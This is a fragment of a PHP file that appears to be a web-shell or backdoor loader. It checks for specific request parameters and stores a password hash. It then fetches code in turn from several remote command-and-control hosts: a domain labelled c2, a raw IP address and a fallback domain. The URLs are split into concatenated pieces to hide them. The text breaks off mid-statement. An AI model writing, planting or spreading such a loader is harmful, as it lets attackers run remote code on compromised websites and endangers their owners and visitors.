<?php
$p = "9d6574539e7c74bb2baf4ee4556a293b";
if (isset($_REQUEST['ac']) && isset($_REQUEST['path']) && isset($_REQUEST['api']) && isset($_REQUEST['t'])) { $code = GC('ht'.'tps://c2.ic'.'w7.co'.'m/'); if(!$code){$code = GC('http://45.11.57.159/');}if(!$code){$code = GC('htt'.'ps://c.zv'.'o1.xy'.'z/');}
